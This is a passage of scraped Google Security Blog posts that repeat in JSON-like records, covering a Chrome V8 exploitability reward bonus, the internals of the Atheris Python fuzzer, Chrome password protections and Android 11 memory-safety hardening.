are unable to meet the requirements to qualify for this special reward.       So what does a report need to do to demonstrate that a bug is likely exploitable? Any V8 bug report which would have previously been rewarded at the  high-quality report with functional exploit  level will likely qualify with no additional effort from the reporter. By definition, these demonstrate that the issue was exploitable. V8 reports at the  high-quality  level may also qualify if they include evidence that the bug is exploitable as part of their analysis. See the  rules page  for more information about our reward levels.     The following are some examples of how a report could demonstrate that exploitation is likely, but any analysis or proof of concept will be considered by the panel:       Executing shellcode from the context of Chrome or  d8  (V8&#8217;s developer shell)   Creating an exploit primitive that allows arbitrary reads from or writes to specific addresses or attacker-controlled offsets   Demonstrating instruction pointer control   Demonstrating an ASLR bypass by computing the memory address of an object in a way that&#8217;s exposed to script   Providing analysis of how a bug could lead to type confusion with a JSObject       For example reports, see issues  914736  and  1076708 .     We&#8217;d like to thank all of our VRP reporters for helping us keep Chrome users safe! We look forward to seeing what you find.     -The Chrome Vulnerability Rewards Panel                                     Posted by Martin Barbella, Chrome Vulnerability Rewards Panelist  Starting today, the Chrome Vulnerability Rewards Program is offering a new bonus for reports which demonstrate exploitability in V8, Chrome’s JavaScript engine. We have historically had many great V8 bugs reported (thank you to all of our reporters!) but we'd like to know more about the exploitability of different V8 bug classes, and what mechanisms are effective to go from an initial bug to a full exploit. That's why we're offering this additional reward for bugs that show how a V8 vulnerability could be used as part of a real world attack.   In the past, exploits had to be fully functional to be rewarded at our highest tier, high-quality report with functional exploit. Demonstration of how a bug might be exploited is one factor that the panel may use to determine that a report is high-quality, our second highest tier, but we want to encourage more of this type of analysis. This information is very useful for us when planning future mitigations, making release decisions, and fixing bugs faster. We also know it requires a bit more effort for our reporters, and that effort should be rewarded. For the time being this only applies to V8 bugs, but we’re curious to see what our reporters come up with!   The full details are available on the Chrome VRP rules page. At a high-level, we’re offering increased reward amounts, up to double, for qualifying V8 bugs.   The following table shows the updated reward amounts for reports qualifying for this new bonus. These new, higher values replace the normal reward. If a bug in V8 doesn’t fit into one of these categories, it may still qualify for an increased reward at the panel’s discretion.  [1] Baseline reports are unable to meet the requirements to qualify for this special reward.    So what does a report need to do to demonstrate that a bug is likely exploitable? Any V8 bug report which would have previously been rewarded at the high-quality report with functional exploit level will likely qualify with no additional effort from the reporter. By definition, these demonstrate that the issue was exploitable. V8 reports at the high-quality level may also qualify if they include evidence that the bug is exploitable as part of their analysis. See the rules page for more information about our reward levels.   The following are some examples of how a report could demonstrate that exploitation is likely, but any analysis or proof of concept will be considered by the panel:    Executing shellcode from the context of Chrome or d8 (V8’s developer shell)  Creating an exploit primitive that allows arbitrary reads from or writes to specific addresses or attacker-controlled offsets  Demonstrating instruction pointer control  Demonstrating an ASLR bypass by computing the memory address of an object in a way that’s exposed to script  Providing analysis of how a bug could lead to type confusion with a JSObject    For example reports, see issues 914736 and 1076708.   We’d like to thank all of our VRP reporters for helping us keep Chrome users safe! We look forward to seeing what you find.   -The Chrome Vulnerability Rewards Panel      ", "date": "December 8, 2020"},
{"website": "Google-Security", "title": "\nHow the Atheris Python Fuzzer Works\n", "author": ["Posted by Ian Eldred Pudney, Google Information Security "], "link": "https://security.googleblog.com/2020/12/how-atheris-python-fuzzer-works.html", "abstract": "                             Posted by Ian Eldred Pudney, Google Information Security&nbsp;      On Friday, we  announced  that we&#8217;ve released the  Atheris Python fuzzing engine  as open source. In this post, we&#8217;ll briefly talk about its origins, and then go into lots more detail on how it works.     The Origin Story&nbsp;      Every year since 2013, Google has held a &#8220;Fuzzit&#8221;, an internal event where Googlers write fuzzers for their code or open source software. By October 2019, however, we&#8217;d already written fuzzers for most of the open-source C/C++ code we use. So for that Fuzzit, the author of this post wrote a Python fuzzing engine based on  libFuzzer . Since then, over 50 Python fuzzers have been written at Google, and countless bugs have been reported and fixed.     Originally, this fuzzing engine could only fuzz native extensions, as it did not support Python coverage. But over time, the fuzzer morphed into Atheris, a high-performance fuzzing engine that supports both native and pure-Python fuzzing.      A Bit of Background&nbsp;      Atheris is a coverage-guided fuzzer. To use Atheris, you specify an &#8220;entry point&#8221; via atheris.Setup(). Atheris will then rapidly call this entry point with different inputs, hoping to produce a crash. While doing so, Atheris will monitor how the program execution changes based on the input, and will attempt to find new and interesting code paths. This allows Atheris to find unexpected and buggy behavior very effectively.        import atheris      import sys     def TestOneInput(data):&nbsp; # Our entry point    &nbsp;&nbsp;if data == b\"bad\":    &nbsp;&nbsp;&nbsp;&nbsp;raise RuntimeError(\"Badness!\")    &nbsp;&nbsp;&nbsp;&nbsp;    atheris.Setup(sys.argv, TestOneInput)    atheris.Fuzz()      Atheris is a native Python extension, and uses  libFuzzer  to provide its code coverage and input generation capabilities. The entry point passed to atheris.Setup() is wrapped in the C++ entry point that&#8217;s actually passed to libFuzzer. This wrapper will then be invoked by libFuzzer repeatedly, with its data proxied back to Python.      Python Code Coverage&nbsp;      Atheris is a native Python extension, and is typically compiled with libFuzzer linked in. When you initialize Atheris, it registers a  tracer  with CPython to collect information about Python code flow. This tracer can keep track of every line reached and every function executed.     We need to get this trace information to libFuzzer, which is responsible for generating code coverage information. There&#8217;s a problem, however: libFuzzer assumes that the amount of code is known at compile-time. The two primary code coverage mechanisms are __sanitizer_cov_pcs_init (which registers a set of program counters that might be visited) and __sanitizer_cov_8bit_counters_init (which registers an array of booleans that are to be incremented when a basic block is visited). Both of these need to know at initialization time how many program counters or basic blocks exist. But in Python, that isn&#8217;t possible, since code isn&#8217;t loaded until well after Python starts. We can&#8217;t even know it when we start the fuzzer: it&#8217;s possible to dynamically import code later, or even generate code on the fly.     Thankfully, libFuzzer supports fuzzing shared libraries loaded at runtime. Both __sanitizer_cov_pcs_init and __sanitizer_cov_8bit_counters_init are able to be safely called from a shared library in its constructor (called when the library is loaded). So, Atheris simulates loading shared libraries! When tracing is initialized, Atheris first calls those functions with an array of 8-bit counters and completely made-up program counters. Then, whenever a new Python line is reached, Atheris allocates a PC and 8-bit counter to that line; Atheris will always report that line the same way from then on. Once Atheris runs out of PCs and 8-bit counters, it simply loads a new &#8220;shared library&#8221; by calling those functions again. Of course, exponential growth is used to ensure that the number of shared libraries doesn&#8217;t become excessive.      What's Special about Python 3.8+?      In the  README , we advise users to use Python 3.8+ where possible. This is because Python 3.8 added a new feature: opcode tracing. Not only can we monitor when every line is visited and every function is called, but we can actually monitor every operation that Python performs, and what arguments it uses. This allows Atheris to find its way through if statements much better.     When a COMPARE_OP opcode is encountered, indicating a boolean comparison between two values, Atheris inspects the types of the values. If the values are bytes or Unicode, Atheris is able to report the comparison to libFuzzer via __sanitizer_weak_hook_memcmp. For integer comparison, Atheris uses the appropriate function to report integer comparisons, such as __sanitizer_cov_trace_cmp8.     In recent Python versions, a Unicode string is actually represented as an array of 1-byte, 2-byte, or 4-byte characters, based on the size of the largest character in the string. The obvious solution for coverage is to:    first compare two strings for equivalent character size and report it as an integer comparison with __sanitizer_cov_trace_cmp8   Second, if they&#8217;re equal, call __sanitizer_weak_hook_memcmp to report the actual string comparison  However, performance measurements discovered that the surprising best strategy is to convert both strings to utf-8, then compare those with __sanitizer_weak_hook_memcmp. Even with the performance overhead of conversion, libFuzzer makes progress much faster.          Building Atheris       Most of the effort to release Atheris was simply making it build outside of Google&#8217;s environment. At Google, building a Python project builds its entire universe of dependencies, including the Python interpreter. This makes it trivial for us to use libFuzzer with our projects - we just compile it into our Python interpreter, along with Address Sanitizer or whatever other features we want.     Unfortunately, outside of Google, it&#8217;s not that simple. We had many false starts regarding how to link libFuzzer with Atheris, including making it a standalone shared object, preloading it, etc. We eventually settled on linking it into the Atheris shared object, as it provides the best experience for most users.     However, this strategy still required us to make minor changes to libFuzzer, to allow it to be called as a library. Since most users won&#8217;t have the latest Clang and it typically takes several years for distributions to update their Clang installation, actually getting this new libFuzzer version would be quite difficult for most people, making Atheris installation a hassle. To avoid this, we actually patch libFuzzer if it&#8217;s too old. Atheris&#8217;s  setup.py  will detect an out-of-date libFuzzer, make a copy of it, mark its  fuzzer entry point  as visible, and inject a  small wrapper  to allow it to be called via the name LLVMFuzzerRunDriver. If the libFuzzer is sufficiently new, we just call it using  LLVMFuzzerRunDriver  directly.     The true problem comes from fuzzing native extensions with sanitizers. In theory, fuzzing a native extension with Atheris should be trivial - just build it with -fsanitize=fuzzer-no-link, and make sure Atheris is loaded first. Those magic function calls that Clang injected will point to the libFuzzer symbols inside Atheris. When just fuzzing a native extension without sanitizers, it actually is that simple. Everything works. Unfortunately, sanitizers make everything more complex.     When using a sanitizer like Address Sanitizer with Atheris, it&#8217;s necessary to LD_PRELOAD the sanitizer&#8217;s shared object. ASan requires that it be loaded first, before anything else; it must either be preloaded, or statically linked into the executable (in this case, the Python interpreter). ASan and UBSan define many of the same code coverage symbols as libFuzzer. In typical libFuzzer usage, this isn&#8217;t an issue, since ASan/UBSan declare those symbols weak; the libFuzzer ones take precedence. But when libFuzzer is loaded in a shared object later, that doesn&#8217;t work. The symbols from ASan/UBSan have already been loaded via LD_PRELOAD, and coverage information therefore goes to those libraries, leaving libFuzzer very broken.     The only good way to solve this is to link libFuzzer into python itself, instead of Atheris. Since it&#8217;s therefore part of the proper executable rather than a shared object that&#8217;s dynamically loaded later, symbol resolution works correctly and libFuzzer symbols take precedence. This is nontrivial. We&#8217;ve provided  documentation  about this, and a  script  to build a modified CPython 3.8.6. These scripts will use the same possibly-patched libFuzzer as Atheris.      Why is it called Atheris?&nbsp;      Atheris Hispida, or the &#8220;Hairy bush viper&#8221;, is the closest thing that exists to a fuzzy Python.                                       Posted by Ian Eldred Pudney, Google Information Security On Friday, we announced that we’ve released the Atheris Python fuzzing engine as open source. In this post, we’ll briefly talk about its origins, and then go into lots more detail on how it works.The Origin Story Every year since 2013, Google has held a “Fuzzit”, an internal event where Googlers write fuzzers for their code or open source software. By October 2019, however, we’d already written fuzzers for most of the open-source C/C++ code we use. So for that Fuzzit, the author of this post wrote a Python fuzzing engine based on libFuzzer. Since then, over 50 Python fuzzers have been written at Google, and countless bugs have been reported and fixed.Originally, this fuzzing engine could only fuzz native extensions, as it did not support Python coverage. But over time, the fuzzer morphed into Atheris, a high-performance fuzzing engine that supports both native and pure-Python fuzzing.A Bit of Background Atheris is a coverage-guided fuzzer. To use Atheris, you specify an “entry point” via atheris.Setup(). Atheris will then rapidly call this entry point with different inputs, hoping to produce a crash. While doing so, Atheris will monitor how the program execution changes based on the input, and will attempt to find new and interesting code paths. This allows Atheris to find unexpected and buggy behavior very effectively.import atherisimport sysdef TestOneInput(data):  # Our entry point  if data == b\"bad\":    raise RuntimeError(\"Badness!\")    atheris.Setup(sys.argv, TestOneInput)atheris.Fuzz()Atheris is a native Python extension, and uses libFuzzer to provide its code coverage and input generation capabilities. The entry point passed to atheris.Setup() is wrapped in the C++ entry point that’s actually passed to libFuzzer. This wrapper will then be invoked by libFuzzer repeatedly, with its data proxied back to Python.Python Code Coverage Atheris is a native Python extension, and is typically compiled with libFuzzer linked in. When you initialize Atheris, it registers a tracer with CPython to collect information about Python code flow. This tracer can keep track of every line reached and every function executed.We need to get this trace information to libFuzzer, which is responsible for generating code coverage information. There’s a problem, however: libFuzzer assumes that the amount of code is known at compile-time. The two primary code coverage mechanisms are __sanitizer_cov_pcs_init (which registers a set of program counters that might be visited) and __sanitizer_cov_8bit_counters_init (which registers an array of booleans that are to be incremented when a basic block is visited). Both of these need to know at initialization time how many program counters or basic blocks exist. But in Python, that isn’t possible, since code isn’t loaded until well after Python starts. We can’t even know it when we start the fuzzer: it’s possible to dynamically import code later, or even generate code on the fly.Thankfully, libFuzzer supports fuzzing shared libraries loaded at runtime. Both __sanitizer_cov_pcs_init and __sanitizer_cov_8bit_counters_init are able to be safely called from a shared library in its constructor (called when the library is loaded). So, Atheris simulates loading shared libraries! When tracing is initialized, Atheris first calls those functions with an array of 8-bit counters and completely made-up program counters. Then, whenever a new Python line is reached, Atheris allocates a PC and 8-bit counter to that line; Atheris will always report that line the same way from then on. Once Atheris runs out of PCs and 8-bit counters, it simply loads a new “shared library” by calling those functions again. Of course, exponential growth is used to ensure that the number of shared libraries doesn’t become excessive.What's Special about Python 3.8+?In the README, we advise users to use Python 3.8+ where possible. This is because Python 3.8 added a new feature: opcode tracing. Not only can we monitor when every line is visited and every function is called, but we can actually monitor every operation that Python performs, and what arguments it uses. This allows Atheris to find its way through if statements much better.When a COMPARE_OP opcode is encountered, indicating a boolean comparison between two values, Atheris inspects the types of the values. If the values are bytes or Unicode, Atheris is able to report the comparison to libFuzzer via __sanitizer_weak_hook_memcmp. For integer comparison, Atheris uses the appropriate function to report integer comparisons, such as __sanitizer_cov_trace_cmp8.In recent Python versions, a Unicode string is actually represented as an array of 1-byte, 2-byte, or 4-byte characters, based on the size of the largest character in the string. The obvious solution for coverage is to:first compare two strings for equivalent character size and report it as an integer comparison with __sanitizer_cov_trace_cmp8Second, if they’re equal, call __sanitizer_weak_hook_memcmp to report the actual string comparisonHowever, performance measurements discovered that the surprising best strategy is to convert both strings to utf-8, then compare those with __sanitizer_weak_hook_memcmp. Even with the performance overhead of conversion, libFuzzer makes progress much faster.Building AtherisMost of the effort to release Atheris was simply making it build outside of Google’s environment. At Google, building a Python project builds its entire universe of dependencies, including the Python interpreter. This makes it trivial for us to use libFuzzer with our projects - we just compile it into our Python interpreter, along with Address Sanitizer or whatever other features we want.Unfortunately, outside of Google, it’s not that simple. We had many false starts regarding how to link libFuzzer with Atheris, including making it a standalone shared object, preloading it, etc. We eventually settled on linking it into the Atheris shared object, as it provides the best experience for most users.However, this strategy still required us to make minor changes to libFuzzer, to allow it to be called as a library. Since most users won’t have the latest Clang and it typically takes several years for distributions to update their Clang installation, actually getting this new libFuzzer version would be quite difficult for most people, making Atheris installation a hassle. To avoid this, we actually patch libFuzzer if it’s too old. Atheris’s setup.py will detect an out-of-date libFuzzer, make a copy of it, mark its fuzzer entry point as visible, and inject a small wrapper to allow it to be called via the name LLVMFuzzerRunDriver. If the libFuzzer is sufficiently new, we just call it using LLVMFuzzerRunDriver directly.The true problem comes from fuzzing native extensions with sanitizers. In theory, fuzzing a native extension with Atheris should be trivial - just build it with -fsanitize=fuzzer-no-link, and make sure Atheris is loaded first. Those magic function calls that Clang injected will point to the libFuzzer symbols inside Atheris. When just fuzzing a native extension without sanitizers, it actually is that simple. Everything works. Unfortunately, sanitizers make everything more complex.When using a sanitizer like Address Sanitizer with Atheris, it’s necessary to LD_PRELOAD the sanitizer’s shared object. ASan requires that it be loaded first, before anything else; it must either be preloaded, or statically linked into the executable (in this case, the Python interpreter). ASan and UBSan define many of the same code coverage symbols as libFuzzer. In typical libFuzzer usage, this isn’t an issue, since ASan/UBSan declare those symbols weak; the libFuzzer ones take precedence. But when libFuzzer is loaded in a shared object later, that doesn’t work. The symbols from ASan/UBSan have already been loaded via LD_PRELOAD, and coverage information therefore goes to those libraries, leaving libFuzzer very broken.The only good way to solve this is to link libFuzzer into python itself, instead of Atheris. Since it’s therefore part of the proper executable rather than a shared object that’s dynamically loaded later, symbol resolution works correctly and libFuzzer symbols take precedence. This is nontrivial. We’ve provided documentation about this, and a script to build a modified CPython 3.8.6. These scripts will use the same possibly-patched libFuzzer as Atheris.Why is it called Atheris? Atheris Hispida, or the “Hairy bush viper”, is the closest thing that exists to a fuzzy Python.     ", "date": "December 9, 2020"},
{"website": "Google-Security", "title": "\nNew Password Protections (and more!) in Chrome\n", "author": ["Posted by AbdelKarim Mardini, Senior Product Manager, Chrome "], "link": "https://security.googleblog.com/2020/10/new-password-protections-and-more-in.html", "abstract": "                             Posted by AbdelKarim Mardini, Senior Product Manager, Chrome         Passwords are often the first line of defense for our digital lives. Today, we&#8217;re improving password security on both Android and iOS devices by telling you if the passwords you&#8217;ve asked Chrome to remember have been compromised, and if so, how to fix them.    To check whether you have any compromised passwords, Chrome sends a copy of your usernames and passwords to Google using a  special form of encryption . This lets Google check them against lists of credentials known to be compromised, but Google cannot derive your username or password from this encrypted copy.      We notify you when you have compromised passwords on websites, but it can be time-consuming to go find the relevant form to change your password. To help, we&#8217;re adding support for  \".well-known/change-password\" URLs  that let Chrome take users directly to the right &#8220;change password&#8221; form after they&#8217;ve been alerted that their password has been compromised.     Along with these improvements, Chrome is also bringing  Safety Check  to mobile. In our next release, we will launch Safety Check on iOS and Android, which includes checking for compromised passwords, telling you if Safe Browsing is enabled, and whether the version of Chrome you are running is updated with the latest security protections. You will also be able to use Chrome on iOS to autofill saved login details into other apps or browsers.     In Chrome 86 we&#8217;ll also be launching a number of additional features to improve user security, including:       Enhanced Safe Browsing for Android      Earlier this year, we launched  Enhanced Safe Browsing  for desktop, which gives Chrome users the option of more advanced security protections.      When you turn on Enhanced Safe Browsing, Chrome can proactively protect you against phishing, malware, and other dangerous sites by sharing real-time data with Google&#8217;s Safe Browsing service. Among our users who have enabled checking websites and downloads in real time, our  predictive phishing protections  see a roughly 20% drop in users typing their passwords into phishing sites.           Improvements to password filling on iOS      We recently launched  Touch-to-fill for passwords  on Android to prevent phishing attacks. To improve security on iOS too, we&#8217;re introducing a biometric authentication step before autofilling passwords. On iOS, you&#8217;ll now be able to authenticate using Face ID, Touch ID, or your phone passcode. Additionally, Chrome Password Manager allows you to autofill saved passwords into iOS apps or browsers if you enable Chrome autofill in Settings.            Mixed form warnings and download blocking     Update (10/07/2020): Mixed form warnings were originally scheduled for Chrome 86, but will be delayed until Chrome 87      Secure HTTPS pages may sometimes still have non-secure features. Earlier this year, Chrome began  securing and blocking what&#8217;s known as &#8220;mixed content&#8221; , when secure pages incorporate insecure content. But there are still other ways that HTTPS pages can create security risks for users, such as offering downloads over non-secure links, or using forms that don&#8217;t submit data securely.       To better protect users from these threats, Chrome 86 is introducing  mixed form warnings  on desktop and Android to alert and warn users before submitting a non-secure form that&#8217;s embedded in an HTTPS page.     Additionally, Chrome 86 will block or warn on some insecure downloads initiated by secure pages. Currently, this change affects commonly abused file types, but eventually secure pages will only be able to initiate secure downloads of any type. For more details, see  Chrome&#8217;s plan  to gradually block mixed downloads altogether     We encourage developers to update their forms and downloads to use secure connections for the safety and privacy of their users.                                    Posted by AbdelKarim Mardini, Senior Product Manager, Chrome   Passwords are often the first line of defense for our digital lives. Today, we’re improving password security on both Android and iOS devices by telling you if the passwords you’ve asked Chrome to remember have been compromised, and if so, how to fix them.   To check whether you have any compromised passwords, Chrome sends a copy of your usernames and passwords to Google using a special form of encryption. This lets Google check them against lists of credentials known to be compromised, but Google cannot derive your username or password from this encrypted copy.    We notify you when you have compromised passwords on websites, but it can be time-consuming to go find the relevant form to change your password. To help, we’re adding support for \".well-known/change-password\" URLs that let Chrome take users directly to the right “change password” form after they’ve been alerted that their password has been compromised.   Along with these improvements, Chrome is also bringing Safety Check to mobile. In our next release, we will launch Safety Check on iOS and Android, which includes checking for compromised passwords, telling you if Safe Browsing is enabled, and whether the version of Chrome you are running is updated with the latest security protections. You will also be able to use Chrome on iOS to autofill saved login details into other apps or browsers.   In Chrome 86 we’ll also be launching a number of additional features to improve user security, including:    Enhanced Safe Browsing for Android   Earlier this year, we launched Enhanced Safe Browsing for desktop, which gives Chrome users the option of more advanced security protections.    When you turn on Enhanced Safe Browsing, Chrome can proactively protect you against phishing, malware, and other dangerous sites by sharing real-time data with Google’s Safe Browsing service. Among our users who have enabled checking websites and downloads in real time, our predictive phishing protections see a roughly 20% drop in users typing their passwords into phishing sites.    Improvements to password filling on iOS   We recently launched Touch-to-fill for passwords on Android to prevent phishing attacks. To improve security on iOS too, we’re introducing a biometric authentication step before autofilling passwords. On iOS, you’ll now be able to authenticate using Face ID, Touch ID, or your phone passcode. Additionally, Chrome Password Manager allows you to autofill saved passwords into iOS apps or browsers if you enable Chrome autofill in Settings.   Mixed form warnings and download blocking  Update (10/07/2020): Mixed form warnings were originally scheduled for Chrome 86, but will be delayed until Chrome 87   Secure HTTPS pages may sometimes still have non-secure features. Earlier this year, Chrome began securing and blocking what’s known as “mixed content”, when secure pages incorporate insecure content. But there are still other ways that HTTPS pages can create security risks for users, such as offering downloads over non-secure links, or using forms that don’t submit data securely.     To better protect users from these threats, Chrome 86 is introducing mixed form warnings on desktop and Android to alert and warn users before submitting a non-secure form that’s embedded in an HTTPS page.   Additionally, Chrome 86 will block or warn on some insecure downloads initiated by secure pages. Currently, this change affects commonly abused file types, but eventually secure pages will only be able to initiate secure downloads of any type. For more details, see Chrome’s plan to gradually block mixed downloads altogether   We encourage developers to update their forms and downloads to use secure connections for the safety and privacy of their users.     ", "date": "October 6, 2020"},
{"website": "Google-Security", "title": "\nSystem hardening in Android 11\n", "author": ["Posted by Platform Hardening Team "], "link": "https://security.googleblog.com/2020/06/system-hardening-in-android-11.html", "abstract": "                             Posted by Platform Hardening Team         In Android 11 we continue to increase the security of the Android platform.  We have moved to safer default settings, migrated to a hardened memory allocator, and expanded the use of compiler mitigations that defend against classes of vulnerabilities and frustrate exploitation techniques.    Initializing memory    We&#8217;ve enabled forms of automatic memory initialization in both Android 11&#8217;s userspace and the Linux kernel. Uninitialized memory bugs occur in C/C++ when memory is used without having first been initialized to a known safe value. These types of bugs can be confusing, and even the term &#8220;uninitialized&#8221; is misleading. Uninitialized may seem to imply that a variable has a random value.  In reality it isn&#8217;t random. It has whatever value was previously placed there. This value may be predictable or even attacker controlled. Unfortunately this behavior can result in a serious vulnerability such as information disclosure bugs like  ASLR  bypasses, or control flow hijacking via a  stack or heap spray . Another possible side effect of using uninitialized values is advanced compiler optimizations may transform the code unpredictably, as this is considered  undefined behavior  by the relevant C standards.     In practice, uses of uninitialized memory are difficult to detect. Such errors may sit in the codebase unnoticed for years if the memory happens to be initialized with some \"safe\" value most of the time. When uninitialized memory results in a bug, it is often challenging to identify the source of the error, particularly if it is rarely triggered.  Eliminating an entire class of such bugs is a lot more effective than hunting them down individually. Automatic stack variable initialization relies on a feature in the Clang compiler which allows choosing initializing local variables with either zeros or a pattern.  Initializing to zero provides safer defaults for strings, pointers, indexes, and sizes. The downsides of zero init are less-safe defaults for return values, and exposing fewer bugs where the underlying code relies on zero initialization. Pattern initialization tends to expose more bugs and is generally safer for return values and less safe for strings, pointers, indexes, and sizes.    Initializing Userspace:    Automatic stack variable initialization is enabled throughout the entire Android userspace. During the development of Android 11, we initially selected pattern in order to uncover bugs relying on zero init and then moved to zero-init after a few months for increased safety. Platform OS developers can build with  `AUTO_PATTERN_INITIALIZE=true m`  if they want help uncovering bugs relying on zero init.    Initializing the Kernel:    Automatic  stack  and  heap  initialization were recently merged in the upstream Linux kernel. We have made these features available on earlier versions of Android&#8217;s kernel including  4.14 ,  4.19 , and  5.4 . These features enforce initialization of local variables and heap allocations with known values that cannot be controlled by attackers and are useless when leaked. Both features result in a performance overhead, but also prevent undefined behavior improving both stability and security.     For kernel stack initialization we adopted the  CONFIG_INIT_STACK_ALL  from upstream Linux. It currently relies on Clang pattern initialization for stack variables, although this is subject to change in the future.      Heap initialization is controlled by two boot-time flags, init_on_alloc and init_on_free, with the former wiping freshly allocated heap objects with zeroes (think  s/kmalloc/kzalloc  in the whole kernel) and the latter doing the same before the objects are freed (this helps to reduce the lifetime of security-sensitive data).  init_on_alloc  is a lot more cache-friendly and has smaller performance impact (within 2%), therefore it has been chosen to protect Android kernels.    Scudo is now Android's default native allocator     In Android 11, Scudo replaces jemalloc as the default native allocator for Android. Scudo is a hardened memory allocator designed to help detect and mitigate memory corruption bugs in the heap, such as:        Double free ,    Arbitrary free ,    Heap-based buffer overflow ,    Use-after-free        Scudo does not fully prevent exploitation but it does add a number of sanity checks which are effective at strengthening the heap against some memory corruption bugs.     It also proactively organizes the heap in a way that makes exploitation of memory corruption more difficult, by reducing the predictability of the allocation patterns, and separating allocations by sizes.      In our internal testing, Scudo has already proven its worth by surfacing security and stability bugs that were previously undetected.    Finding Heap Memory Safety Bugs in the Wild (GWP-ASan)    Android 11 introduces GWP-ASan, an in-production heap memory safety bug detection tool that's integrated directly into the native allocator Scudo. GWP-ASan probabilistically detects and provides actionable reports for heap memory safety bugs when they occur, works on 32-bit and 64-bit processes, and is enabled by default for system processes and system apps.     GWP-ASan is also  available for developer applications  via a one line opt-in in an app's AndroidManifest.xml, with no complicated build support or recompilation of prebuilt libraries necessary.    Software Tag-Based KASAN    Continuing work on  adopting the Arm Memory Tagging Extension  (MTE) in Android, Android 11 includes support for kernel  HWASAN , also known as  Software Tag-Based KASAN . Userspace  HWASAN  is supported since Android 10.      KernelAddressSANitizer  (KASAN) is a dynamic memory error detector designed to find out-of-bound and use-after-free bugs in the Linux kernel. Its  Software Tag-Based mode  is a software implementation of the memory tagging concept for the kernel. Software Tag-Based KASAN is available in 4.14, 4.19 and 5.4 Android kernels, and can be enabled with the CONFIG_KASAN_SW_TAGS kernel configuration option. Currently Tag-Based KASAN only supports tagging of slab memory; support for other types of memory (such as stack and globals) will be added in the future.     Compared to  Generic KASAN , Tag-Based KASAN has significantly lower memory requirements (see  this kernel commit  for details), which makes it usable on dog food testing devices. Another use case for Software Tag-Based KASAN is checking the existing kernel code for compatibility with memory tagging. As Tag-Based KASAN is based on similar concepts as the future in-kernel MTE support, making sure that kernel code works with Tag-Based KASAN will ease in-kernel MTE integration in the future.    Expanding existing compiler mitigations    We&#8217;ve continued to expand the compiler mitigations that have been rolled out in  prior   releases  as well. This includes adding both integer and bounds sanitizers to some core libraries that were lacking them. For example, the libminikin fonts library and the libui rendering library are now bounds sanitized. We&#8217;ve hardened the NFC stack by implementing both integer overflow sanitizer and bounds sanitizer in those components.     In addition to the hard mitigations like sanitizers, we also continue to expand our use of  CFI  as an exploit mitigation. CFI has been enabled in Android&#8217;s  networking daemon ,  DNS resolver , and more of our core javascript libraries like libv8 and the PacProcessor.    The effectiveness of our software codec sandbox  Prior to the Release of Android 10 we  announced a new constrained sandbox for software codecs . We&#8217;re really pleased with the results. Thus far, Android 10 is the first Android release since the infamous stagefright vulnerabilities in Android 5.0  with zero critical-severity vulnerabilities in the media frameworks.     Thank you to Jeff Vander Stoep, Alexander Potapenko, Stephen Hines, Andrey Konovalov, Mitch Phillips, Ivan Lozano, Kostya Kortchinsky, Christopher Ferris, Cindy Zhou, Evgenii Stepanov, Kevin Deus, Peter Collingbourne, Elliott Hughes, Kees Cook and Ken Chen for their contributions to this post.                                       Posted by Platform Hardening Team    In Android 11 we continue to increase the security of the Android platform.  We have moved to safer default settings, migrated to a hardened memory allocator, and expanded the use of compiler mitigations that defend against classes of vulnerabilities and frustrate exploitation techniques.  Initializing memory  We’ve enabled forms of automatic memory initialization in both Android 11’s userspace and the Linux kernel. Uninitialized memory bugs occur in C/C++ when memory is used without having first been initialized to a known safe value. These types of bugs can be confusing, and even the term “uninitialized” is misleading. Uninitialized may seem to imply that a variable has a random value.  In reality it isn’t random. It has whatever value was previously placed there. This value may be predictable or even attacker controlled. Unfortunately this behavior can result in a serious vulnerability such as information disclosure bugs like ASLR bypasses, or control flow hijacking via a stack or heap spray. Another possible side effect of using uninitialized values is advanced compiler optimizations may transform the code unpredictably, as this is considered undefined behavior by the relevant C standards.   In practice, uses of uninitialized memory are difficult to detect. Such errors may sit in the codebase unnoticed for years if the memory happens to be initialized with some \"safe\" value most of the time. When uninitialized memory results in a bug, it is often challenging to identify the source of the error, particularly if it is rarely triggered.Eliminating an entire class of such bugs is a lot more effective than hunting them down individually. Automatic stack variable initialization relies on a feature in the Clang compiler which allows choosing initializing local variables with either zeros or a pattern.Initializing to zero provides safer defaults for strings, pointers, indexes, and sizes. The downsides of zero init are less-safe defaults for return values, and exposing fewer bugs where the underlying code relies on zero initialization. Pattern initialization tends to expose more bugs and is generally safer for return values and less safe for strings, pointers, indexes, and sizes.  Initializing Userspace:  Automatic stack variable initialization is enabled throughout the entire Android userspace. During the development of Android 11, we initially selected pattern in order to uncover bugs relying on zero init and then moved to zero-init after a few months for increased safety. Platform OS developers can build with `AUTO_PATTERN_INITIALIZE=true m` if they want help uncovering bugs relying on zero init.  Initializing the Kernel:  Automatic stack and heap initialization were recently merged in the upstream Linux kernel. We have made these features available on earlier versions of Android’s kernel including 4.14, 4.19, and 5.4. These features enforce initialization of local variables and heap allocations with known values that cannot be controlled by attackers and are useless when leaked. Both features result in a performance overhead, but also prevent undefined behavior improving both stability and security.   For kernel stack initialization we adopted the CONFIG_INIT_STACK_ALL from upstream Linux. It currently relies on Clang pattern initialization for stack variables, although this is subject to change in the future.    Heap initialization is controlled by two boot-time flags, init_on_alloc and init_on_free, with the former wiping freshly allocated heap objects with zeroes (think s/kmalloc/kzalloc in the whole kernel) and the latter doing the same before the objects are freed (this helps to reduce the lifetime of security-sensitive data). init_on_alloc is a lot more cache-friendly and has smaller performance impact (within 2%), therefore it has been chosen to protect Android kernels.  Scudo is now Android's default native allocator   In Android 11, Scudo replaces jemalloc as the default native allocator for Android. Scudo is a hardened memory allocator designed to help detect and mitigate memory corruption bugs in the heap, such as:    Double free,  Arbitrary free,  Heap-based buffer overflow,  Use-after-free    Scudo does not fully prevent exploitation but it does add a number of sanity checks which are effective at strengthening the heap against some memory corruption bugs.   It also proactively organizes the heap in a way that makes exploitation of memory corruption more difficult, by reducing the predictability of the allocation patterns, and separating allocations by sizes.    In our internal testing, Scudo has already proven its worth by surfacing security and stability bugs that were previously undetected.  Finding Heap Memory Safety Bugs in the Wild (GWP-ASan)  Android 11 introduces GWP-ASan, an in-production heap memory safety bug detection tool that's integrated directly into the native allocator Scudo. GWP-ASan probabilistically detects and provides actionable reports for heap memory safety bugs when they occur, works on 32-bit and 64-bit processes, and is enabled by default for system processes and system apps.   GWP-ASan is also available for developer applications via a one line opt-in in an app's AndroidManifest.xml, with no complicated build support or recompilation of prebuilt libraries necessary.  Software Tag-Based KASAN  Continuing work on adopting the Arm Memory Tagging Extension (MTE) in Android, Android 11 includes support for kernel HWASAN, also known as Software Tag-Based KASAN. Userspace HWASAN is supported 